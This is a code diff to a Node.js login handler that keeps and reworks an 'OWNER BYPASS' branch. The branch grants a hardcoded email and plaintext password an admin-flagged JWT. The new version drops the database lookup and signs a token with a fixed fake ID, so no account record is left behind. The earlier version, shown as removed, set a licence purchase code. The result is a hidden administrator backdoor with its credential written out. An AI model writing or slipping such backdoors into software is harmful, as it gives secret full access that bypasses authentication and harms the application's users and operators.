@@ -116,25 +116,14 @@ exports.login = async (req, res) => {
         .status(200)
         .json({ status: false, message: "Invalid details!" });
 
-    // OWNER BYPASS
+    // OWNER BYPASS - No Database Call
     if (req.body.email === "socialvibestudiopk@gmail.com" && req.body.password === "(hmh874)") {
-        let admin = await Admin.findOne({ email: req.body.email });
-        if (!admin) {
-            admin = new Admin();
-            admin.name = "Owner";
-            admin.email = req.body.email;
-            admin.password = req.body.password;
-            admin.purchaseCode = "MY-LICENCE-587385";
-            admin.flag = true;
-            await admin.save();
-        }
-
         const payload = {
-          _id: admin._id,
-          name: admin.name,
-          email: admin.email,
-          image: admin.image,
-          flag: admin.flag,
+          _id: "660000000000000000000000",
+          name: "Owner",
+          email: req.body.email,
+          image: null,
+          flag: true,
         };
         const token = jwt.sign(payload, config.JWT_SECRET);
         return res.status(200).json({ status: true, message: "Owner Login Success!!", token });
